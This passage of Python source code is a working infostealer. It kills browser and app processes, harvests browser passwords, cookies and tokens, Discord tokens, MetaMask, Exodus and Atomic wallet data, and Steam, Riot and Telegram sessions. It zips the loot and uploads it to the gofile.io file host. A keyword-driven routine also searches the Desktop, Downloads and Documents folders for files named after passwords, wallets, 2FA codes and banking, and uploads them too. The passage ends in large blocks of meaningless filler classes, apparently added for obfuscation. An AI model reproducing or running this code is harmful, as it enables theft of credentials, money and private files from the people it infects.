            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def Z1pTh1ngs(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getT0k3n, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=G3tD1sc0rd, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getP4ssw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getC00k13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = TR6st(C00k13)
    if DETECTED == True: return

    for patt in browserPaths:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]]).start()
    
    for patt in PathsToZip:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]]).start()
    
    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["crpassw.txt", "crcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret",
        "senhas",
        "contas",
        "backup",
        "2fa",
        "importante",
        "privado",
        "exodus",
        "exposed",
        "perder",
        "amigos",
        "empresa",
        "trabalho",
        "work",
        "private",
        "source",
        "users",
        "username",
        "login",
        "user",
        "usuario",
        "log"
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",                                                          
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "mom",
        "family"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, P4sswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiCount, P4sswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = TR6st(C00k13)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)

class mnoyHKCLWLNrEtxEizr:
    def __init__(self):
        self.__eLYuCoUerhTEfnDCF()
        self.__BlwZeJSSV()
        self.__GSWZHETBKQdUtQYgo()
        self.__jFRgszSHD()
        self.__bOTGADSlodfCQnnfhw()
        self.__YhFcHIRwTl()
        self.__jRjzkyBRCBMJAx()
        self.__lvJuzDBubakc()
    def __eLYuCoUerhTEfnDCF(self, gsYxcRsUdqELeOYHk, yQHJjidBtUwsYBgGmftX, HICjLSam, GKkGHXBBGWlewcQvYa, LbeReqSFtFZ, dUxuRilUemOjhv, ZsaxxtjIZBjHWuA):
        return self.__bOTGADSlodfCQnnfhw()
    def __BlwZeJSSV(self, GlBOSCHVaX, plDNubQFesNtx, gkEyCtjrQI, CmfxoQjeNiiKxa, XOTDUiah):
        return self.__bOTGADSlodfCQnnfhw()
    def __GSWZHETBKQdUtQYgo(self, gleyGm):
        return self.__eLYuCoUerhTEfnDCF()
    def __jFRgszSHD(self, OaThJhbsUv, DHCJqQPrr, wxoYsNjkvaZkAvmrStw):
        return self.__BlwZeJSSV()
    def __bOTGADSlodfCQnnfhw(self, VePLxLsEqCuUyyftHG, cbHtSR):
        return self.__YhFcHIRwTl()
    def __YhFcHIRwTl(self, hHkygW, lCvPpHtacWiBcPc, zlUIFBoWnaZv, cuJDpNKzQKjihuikmY, OmKCUVIwk):
        return self.__bOTGADSlodfCQnnfhw()
    def __jRjzkyBRCBMJAx(self, aBevtk, PCZohedoMAZHVLVsY, zwJoCvvMrWImVtoRkq):
        return self.__lvJuzDBubakc()
    def __lvJuzDBubakc(self, ElcgFhrigl, CyZKLQktLdHSOIsSx, ncbshLFxkilNjeX, pfSlencKEQqhZ, UWvCIMEJWTpicx):
        return self.__jRjzkyBRCBMJAx()
class yaFFIgzr:
    def __init__(self):
        self.__BzraCHojkviLPhECO()
        self.__fPEfDoaQtRCkOBEzM()
        self.__njaBHvgekvNmrCCRdM()
        self.__VkPHYzrBHk()
        self.__rRSPBEDGBKmkvyLuYzn()
        self.__OjxodAxWkDAvhRitpwpq()
        self.__ocYPOkdTMu()
        self.__jLBydBXlG()
        self.__oxSRCPoxO()
        self.__ihmbjXstHi()
        self.__UvgJhuIgvx()
        self.__MgUbekiEdu()
        self.__xyFDZBSiEmk()
        self.__sZHznCOyOwFNIbW()
    def __BzraCHojkviLPhECO(self, GPeYLltRBVNQMOuTj):
        return self.__rRSPBEDGBKmkvyLuYzn()
    def __fPEfDoaQtRCkOBEzM(self, QKIUCzSOXpzZotP, EghLdef, xqaltYdrmsXw):
        return self.__ihmbjXstHi()
    def __njaBHvgekvNmrCCRdM(self, mDOfUQSq, GfgQcLfRsLXijXF, htcGySMGUZBURds, EgRcV):
        return self.__ocYPOkdTMu()
    def __VkPHYzrBHk(self, iFGALd, rytkhBciiAUm):
        return self.__njaBHvgekvNmrCCRdM()
    def __rRSPBEDGBKmkvyLuYzn(self, ePTdMOr, THMRHlHmDmqkyDxmCzSF, TKEIdKowCwUofCU, LOUssEJgdIqxQaBgnBP):
        return self.__VkPHYzrBHk()
    def __OjxodAxWkDAvhRitpwpq(self, abgIgvpLNxwz, dEttdXB, qkpgCgJBaxTtvNKJNqGy, VNbTsP, wDhisgbQaYaci):
        return self.__njaBHvgekvNmrCCRdM()
    def __ocYPOkdTMu(self, RMDbMIYFWHFiBuNlv, kQyBbOpXUWoJlX, SNxeeklbpEOfKlQQb, yYvRzDHasJUhRKJXxAt, LQrFVUQntDBldeJEzm):
        return self.__jLBydBXlG()
    def __jLBydBXlG(self, KcwbVfigZwGfvdN, EgIObxafOuYmCzcz, kcYAMZmWOlgCdneuUc):
        return self.__BzraCHojkviLPhECO()
    def __oxSRCPoxO(self, KIiKI, YYwGSfx, depCtu, HIfKShjHjecUrb, wfMIR, ejbHJTlRhdAWzJHU):
        return self.__fPEfDoaQtRCkOBEzM()
    def __ihmbjXstHi(self, PZKwZjy, JBMyYfCQmJcqYuY):
        return self.__ihmbjXstHi()
    def __UvgJhuIgvx(self, ZgfITkYHFlnQLP, alHca):
        return self.__rRSPBEDGBKmkvyLuYzn()
    def __MgUbekiEdu(self, mezegBSoqMnyKqHmi):
        return self.__ocYPOkdTMu()
    def __xyFDZBSiEmk(self, rLuPmPbjdKzAd, huufghMPKHEZtWgHp, qVsTzpRogrntmxjUO, DOrazlONf, xpmimVami, IzeMuC):
        return self.__MgUbekiEdu()
    def __sZHznCOyOwFNIbW(self, pVbGStpdQru):
        return self.__OjxodAxWkDAvhRitpwpq()
class AIGastIhH:
    def __init__(self):
        self.__pTTJnZMfpreFutwPpfr()
        self.__PtoxsqumPxaJqzziK()
        self.__FIxNOtXFGmSEa()
        self.__VDjfjvrDcTh()
        self.__rIvhHeud()
        self.__AJFgHRuXytXuiSAYqGk()
        self.__ykRoxsTUxeH()
        self.__atODTdwsjWVtSSySUZSw()
        self.__NJLghJQegQRkLu()
        self.__uMnzdSzQMQDHiPkvE()
        self.__oxoXcExmVykRbCQDFOe()
        self.__iSbCshCdrDCxByAlT()
        self.__pzzOhJDt()
        self.__EGtFPEPKNRtHwBG()
        self.__NpPVjnWRQvOrqdHR()
    def __pTTJnZMfpreFutwPpfr(self, jedRnQPKU, qKjbXQzRMntdQDk, DcOJKztXXXyG, ikmPymXgx, WfUraZxMyuapbQC, Omclvxj, cuUprCG):
        return self.__oxoXcExmVykRbCQDFOe()
    def __PtoxsqumPxaJqzziK(self, VqczzFNcRAbEeu, psfYFqvlyNVcwIW, qQJPBcYbdSXsIIZQ):
        return self.__NpPVjnWRQvOrqdHR()
    def __FIxNOtXFGmSEa(self, rrehAsIRqxv, BJsHOQXZGoPUaRLPooh, RWNGnm):
        return self.__AJFgHRuXytXuiSAYqGk()
    def __VDjfjvrDcTh(self, MhBxElXKL, XsRQGwtKh, aOjcBSFHqQlWMlrcHVGV, eRrFa, IYBZJuZmEKqcuMdfIr, tLNXdiwQpyNXFMRomMv):
        return self.__EGtFPEPKNRtHwBG()
    def __rIvhHeud(self, Sfcebrgbhzv, MlKMKDuA, gblJKqlfBabX, JZMmQfoYeC):
        return self.__EGtFPEPKNRtHwBG()
    def __AJFgHRuXytXuiSAYqGk(self, EvMOqWoYgpsIf):
        return self.__uMnzdSzQMQDHiPkvE()
    def __ykRoxsTUxeH(self, hqKfHSMMsYkFyYbuSORU, bgaaBgNpcFSnksA, PAZMQHOYxFARXFGcuWo, SDxhTudX, wRszHLlqahlXWwnVhkW, WGjTvfEucxJwpNedW):
        return self.__EGtFPEPKNRtHwBG()
    def __atODTdwsjWVtSSySUZSw(self, PmdjbeuDw, vjLIFiGC, qyFrECbYnD):
        return self.__NJLghJQegQRkLu()
    def __NJLghJQegQRkLu(self, OeHflgPaHbArxbIGNQtW, KHzhCgQcAFsrG, mFrUxmeCQtEQitrArrO):
        return self.__NpPVjnWRQvOrqdHR()
    def __uMnzdSzQMQDHiPkvE(self, HBzcrzAXn, GJVXJRXPyBBe):
        return self.__PtoxsqumPxaJqzziK()
    def __oxoXcExmVykRbCQDFOe(self, TmcSpvMOEA):
        return self.__FIxNOtXFGmSEa()
    def __iSbCshCdrDCxByAlT(self, cfRHkS, NdhNuheQGTnUJzeIkGH, zTAXajOlz, zvnSs, IGWmXLZWvEZfWgNAmU):
        return self.__FIxNOtXFGmSEa()
    def __pzzOhJDt(self, gIavY, MjLlvZGLamowzkkOjJV, QQTmJPuJszIxKAwrcnBx, KMTtAmFzhImIVfifIXpD, HRqsAVVYcPYXBm, tkWfeooHQYZmynIamIPZ, gMZDHbsYj):
        return self.__uMnzdSzQMQDHiPkvE()
    def __EGtFPEPKNRtHwBG(self, HsbNhXALelQoTHXu, yipxwUCSEMM, MgzJrVCJrgQsY, TnwRfl, mbfilXbPGZYaH):
        return self.__pTTJnZMfpreFutwPpfr()
    def __NpPVjnWRQvOrqdHR(self, SPyYtZx, PoRbeP):
        return self.__PtoxsqumPxaJqzziK()

class GhCbAFTs:
    def __init__(self):
        self.__bliQuwVIJprqHeaOCH()
        self.__XZcVpYUO()
        self.__FWaCrxwMxuSOmwbs()
        self.__gMUlkVvFZIkDKgodnE()
        self.__dHIowcSwZsUv()
        self.__QvMQvddkhMnrvXCT()
        self.__XHGkxiLgRC()
        self.__SxtSCdDSoUBhNnuq()
        self.__MzfbLDaOMRbbImy()
        self.__KaQnhdsLjLPeRDg()
        self.__einSpKPqyuza()
        self.__VOIxDKtQDzxkUGfNoTSB()
        self.__ufINprrvsnVaboeg()
    def __bliQuwVIJprqHeaOCH(self, aJemjJkO, zRgGF):
        return self.__FWaCrxwMxuSOmwbs()
    def __XZcVpYUO(self, DBCIGT, EzScbKNJUP, WPKAidSg, bWcTHBGU, tOVqBsw, PltwApIHY):
        return self.__FWaCrxwMxuSOmwbs()
    def __FWaCrxwMxuSOmwbs(self, sBcQjfyr):
        return self.__FWaCrxwMxuSOmwbs()
    def __gMUlkVvFZIkDKgodnE(self, SRnPtFloi, mrSDLmbAeNyhRclWBi, uuxailHnL, vhzuWxAnWIblyRfpd, TVDLzwcgTKfEbyFq):
        return self.__dHIowcSwZsUv()
    def __dHIowcSwZsUv(self, SLFvsVR, twFjUGVGklRxOqJ, OmnEUyQOubufpKag, DxEthuCBAslBGsgeA, SnmtGue):
        return self.__gMUlkVvFZIkDKgodnE()
    def __QvMQvddkhMnrvXCT(self, KDDWAFAbaroaadA, LyeQLa):
        return self.__QvMQvddkhMnrvXCT()
    def __XHGkxiLgRC(self, tVzCvAqviTLJ, UDCfxddvWvdDwN, vYlsOaxwwtQRQvyqcr, VxXbgtRgxkiT, fQVeaMm, cnpuUumAeNn, UJPJnjczERWOqYa):
        return self.__VOIxDKtQDzxkUGfNoTSB()
    def __SxtSCdDSoUBhNnuq(self, qeYYtRgmICRkzuZ, fhyeByw, rTpizNTuoAwRvWuz, wHOBgJR, LzuHGGUlXelXWOR):
        return self.__KaQnhdsLjLPeRDg()
    def __MzfbLDaOMRbbImy(self, YLFVbihKgnxHrGWdq, SOQiKuvoavP, dhWcMZgpoJIoX, KaEuXGsbqGIXPg, YoAdshCpdJM):
        return self.__ufINprrvsnVaboeg()
    def __KaQnhdsLjLPeRDg(self, julBamQB, SpjUHPkje, KsmLmG):
        return self.__KaQnhdsLjLPeRDg()
    def __einSpKPqyuza(self, OmuEfPBOvbyLO, RSQlBws, wcTylO, PAchqyBeSzdTXNnvYr, tcTQq, vgPhwwnDJF, ztWIixmUGtyCKVxPX):
        return self.__dHIowcSwZsUv()
    def __VOIxDKtQDzxkUGfNoTSB(self, vcVVEYgmQb, nsFBeNxZN, illqGoAvDSwlkQnuPvrN, HjOBf, NraBsCiuXziViYkBan, VxAylKSFqPPcWPI):
        return self.__einSpKPqyuza()
    def __ufINprrvsnVaboeg(self, vUcwpodXrPtbiojQms, iHhOtXQeStywJxWdQ, KsPtecjyNCZqrh, pRnqvi, xoxGHbJ, HCZUcEJmLKjfjzYPoJl):
        return self.__FWaCrxwMxuSOmwbs()
class yzxZVfuwZYlcx:
    def __init__(self):
        self.__quveaqosePdXcB()
        self.__sWQBmbqouAkPVkzRrykz()
        self.__yBkkeiNVXwUghKdBdMu()
        self.__vytBTnuwzW()
        self.__ZmowGfPxuzUqF()
        self.__gmmkWkmJyIhwKVoJQ()
        self.__OlNTxNUPhZiRs()
        self.__CaGVOOfwHmerTgfov()
    def __quveaqosePdXcB(self, lWxeLUXCckPNED, xZCPMfAHmja, AANiuGGlAfphOrtQYjiS, eHCIcUHHmmThmF, RbkNUBjaAlfzowjDyb, XjNOPJGhuhbQvwWx):
        return self.__vytBTnuwzW()
    def __sWQBmbqouAkPVkzRrykz(self, wCFLX):
        return self.__ZmowGfPxuzUqF()
    def __yBkkeiNVXwUghKdBdMu(self, pvAPm, kamLbMErZJwG, RNrRCmoKrDVrCoZO, CeqZSENanLPdGOryNj):
        return self.__gmmkWkmJyIhwKVoJQ()
    def __vytBTnuwzW(self, QGhBAe):
        return self.__vytBTnuwzW()
    def __ZmowGfPxuzUqF(self, SblpgOu):
        return self.__vytBTnuwzW()
    def __gmmkWkmJyIhwKVoJQ(self, GolpFs, UgrgsWwpoUgp):
        return self.__gmmkWkmJyIhwKVoJQ()
    def __OlNTxNUPhZiRs(self, nSsrxTNSARQB, XewMkvoVPte, TyAiAJhPb, BrnDgzENbecBlJQOYEP, aQLdXgHbTarYuMQzwoZS, MEdKNMGSOpopU, QrfkROOOktr):
        return self.__vytBTnuwzW()
    def __CaGVOOfwHmerTgfov(self, fGcuElYZX):
        return self.__sWQBmbqouAkPVkzRrykz()

class AmRhOOOjVx:
    def __init__(self):
        self.__eDeSbUIjrUIqFXuCZsk()
        self.__NOrytqTrQ()
        self.__YPxeuTVAukT()
        self.__FauWOMUlwMBraUtA()
        self.__yTtpAZxCTGTHRbIkz()
        self.__IiOQgEDpAyA()
        self.__XKkiEdYaqmpH()
        self.__TltrNYIdZz()
    def __eDeSbUIjrUIqFXuCZsk(self, ekCEFHug, dhIZxxSfHi, elddeDou, WTQGuUlNZVIyJrro, UHbooAS, MSDlfyDgkiArrVUytz, WnSlBlEKVUYCR):
        return self.__IiOQgEDpAyA()
    def __NOrytqTrQ(self, NgPnptVPdn, hpIKffbJMrvM, lkptpbhIdZhYGpdzQR):
        return self.__XKkiEdYaqmpH()
    def __YPxeuTVAukT(self, ahHjTEX, qBNJDOXDaOB, mLGczUCc, GWWKunUVXWGJxded, XpwJUZqU):
        return self.__YPxeuTVAukT()
    def __FauWOMUlwMBraUtA(self, YbcBBMmWzuuo):
        return self.__eDeSbUIjrUIqFXuCZsk()
    def __yTtpAZxCTGTHRbIkz(self, nUiRaJlxUBWnc, pzBozUcrJyWOiJQ, mHasXaBVZbG, fvJfB, XBGsttnJdNEzgBZqup, FWTmzWgo, sfcYPPMbgBxudCbfllwV):
        return self.__IiOQgEDpAyA()
    def __IiOQgEDpAyA(self, SAIQJ, JOkWZxdIktLfgLPzWfFz):
        return self.__IiOQgEDpAyA()
    def __XKkiEdYaqmpH(self, mJMydrhvQKxJQ, harzJHCiYawoU, KIgrPMReXDxqvhUfF, pLyuHobticZmS, UsSwbOo, eRuaNyRireDBf):
        return self.__XKkiEdYaqmpH()
    def __TltrNYIdZz(self, cjajojN, rZnkHdqZCYSpqwEGljR, fpVQrHqJCZGdl, EoekYtUhmS, UeuvMEa, sFPwdRWjqzvoDRrPpYw, mlOSsRX):
        return self.__eDeSbUIjrUIqFXuCZsk()
class aHtCSjkuq:
    def __init__(self):
        self.__NWiIjHrRSbaz()
        self.__evpygaEr()
        self.__NJMrxeVG()
        self.__dyKRZlUsPjDcYskoMqk()
        self.__AblrRXwgylc()
        self.__vibCiYXF()
        self.__azIEgAwkGM()
        self.__SdZikNjYZuHAsRxw()
        self.__YBuVDjaQyCsNTwyYd()
        self.__DvHmklEbotODpjRwK()
        self.__WIpuFzIWWur()
    def __NWiIjHrRSbaz(self, TejFyGdTpwAlCsVln, FNRbduQtpdoub, ESAMrvolqHooAouInzm, EMeiwJSrsSzEQdeSC, kYmQPPA, ZNuvVwjHFyCHm):
        return self.__NWiIjHrRSbaz()
    def __evpygaEr(self, bDhTUcsXiTf, HSlYvgkIDFkDVz, DHcjo):
        return self.__NJMrxeVG()
    def __NJMrxeVG(self, uPqDIpwbYE, RRTXSaLjhfnaMWmKb, mOYgyUhtODL, aSwWLqejywizq, NZSFUlTfCjMmlTREos):
        return self.__WIpuFzIWWur()
    def __dyKRZlUsPjDcYskoMqk(self, kvzilPyRq, qgQnqkRnwiFEueuegXC, hDEdsf, iGBNbQhKxjPVbxvGrh, cJGIItt):
        return self.__WIpuFzIWWur()
    def __AblrRXwgylc(self, lICSr):
        return self.__evpygaEr()
    def __vibCiYXF(self, hWruqtDodcxgcu, DfQGdzWijtsTnxj, vfOxdhf, SQWCfBrOcmPfeepxDn, lzmCUHvd, OwkRlcOY, CKjcSJrtBNgNjdUNACkH):
        return self.__DvHmklEbotODpjRwK()
    def __azIEgAwkGM(self, otgAWNlv, SOlQeLqyXdbpSw, UavBuwpCO, IrKzcnNnDDxhEJI, YMFZldnQuSeyqZ):
        return self.__NWiIjHrRSbaz()
    def __SdZikNjYZuHAsRxw(self, OGrcOyUbqiBexJwcXLB, sSxOaI, nDhzKqTRrMKsEBv, bwyohyaylqq, ZjiGOZGyLozErRTnFMz, itjKxpbAVuklpFLA):
        return self.__DvHmklEbotODpjRwK()
    def __YBuVDjaQyCsNTwyYd(self, vxlZeeDYizrnT, vRjynfkbDqB):
        return self.__azIEgAwkGM()
    def __DvHmklEbotODpjRwK(self, xsOOUJM, swEaTJbLJaI):
        return self.__WIpuFzIWWur()
    def __WIpuFzIWWur(self, HEslOvDYueziKbWs, VNzlh, KFYfVATaOHlvHTAralK, HsymhOchdjtkWoun, XBpqGJfz, KAYuyBU, eQAyPmatfY):
        return self.__NWiIjHrRSbaz()
class ugvXVoPHsnTP:
    def __init__(self):
        self.__BZJuXvsdGAUotUGjR()
        self.__YTUcOhMShA()
        self.__pXMtYlTV()
        self.__TGRSFMOJkIHrCopkeRJ()
        self.__OwDPvWwq()
        self.__injaISLXcCqhYt()
        self.__SisIcGvigLB()
        self.__CAuvuFmqdsQKAtczmVw()
        self.__QsYMHCkjrTkOKGLL()
        self.__gjchvrvvQHfYuoPOtLB()
        self.__eCVnDEtDKx()
        self.__RwuEhqiWPJyqZJg()
    def __BZJuXvsdGAUotUGjR(self, QOjyXTGrRrxLtpHk, JxPgZyA, IyFQEaRxfMGJFlDq, nKDZfDOBqMbgZ):
        return self.__BZJuXvsdGAUotUGjR()
    def __YTUcOhMShA(self, OFMIjBI, TrFsfMRrkTFq, lYtQRnItLaJPmDyXkcPD, pJeKJIwtrHiYEcceru, ctmsrkH, kdkqwd):
        return self.__TGRSFMOJkIHrCopkeRJ()
    def __pXMtYlTV(self, UksnIwYinSHqIzGuwdfD, MpAJWZamycazChtZ, vvDMmBsQucjBNOlmkXWr, rMgHyKbqR, cBasGzso, DtQDUd, vXfjLWnlsuZZmD):
        return self.__BZJuXvsdGAUotUGjR()
    def __TGRSFMOJkIHrCopkeRJ(self, tApHasErkLULtVpGRo, zTdShfwNIBOij, yDxQmVyOcobojo):
        return self.__pXMtYlTV()
    def __OwDPvWwq(self, isJsMm, COAQRxfJvxWPU):
        return self.__injaISLXcCqhYt()
    def __injaISLXcCqhYt(self, nGIwZIJxsWxLEbAQr, ZrgPvwsykEONQHxyr):
        return self.__eCVnDEtDKx()
    def __SisIcGvigLB(self, UyOHfkL, MkAnicdbKm, HcqoWXGtuadeVa, ZobKlYq):
        return self.__pXMtYlTV()
    def __CAuvuFmqdsQKAtczmVw(self, UQwDZiTwImQHYrTpXZ, ZPazZnUQyYktHhXVw, ZmPCcii, boYVONylEg, cobpryTjN, LOmlLcZJtyFTzOisd):
        return self.__YTUcOhMShA()
    def __QsYMHCkjrTkOKGLL(self, LhnrBteCQemKo, RzLsUQG, FXhnGqXOeNeiJGX, hKHuRyhEAhZP, KBoaVRUDTAzphbO, qtrmTQkQtUXfBEnEzKgb):
        return self.__QsYMHCkjrTkOKGLL()
    def __gjchvrvvQHfYuoPOtLB(self, HRAlsRXscMBrHcMIy, BagMHsozsToPKOaQW, CASRFtzpUDggDHuHYX, ZxJvVHMyLonKZxCICd, FbxbwEGwHXJEVda, Zcmzwen):
        return self.__CAuvuFmqdsQKAtczmVw()
    def __eCVnDEtDKx(self, KRIAE, YAvJjxKYIYCdM, rIBMuFjEOqdPJfLCh, sPzgoXPbwn):
        return self.__CAuvuFmqdsQKAtczmVw()
    def __RwuEhqiWPJyqZJg(self, ihIzReDkg):
        return self.__injaISLXcCqhYt()
class RwPNVmqRqHnqHa:
    def __init__(self):
        self.__xMIybJgkzeyMzDYc()
        self.__UwVSwuYAbFqTTUwrxS()
        self.__eAQuNawYnOjdYa()
        self.__gNQGjfAckZrZtYedLn()
        self.__LEozoDqWFZeYVbDuYlD()
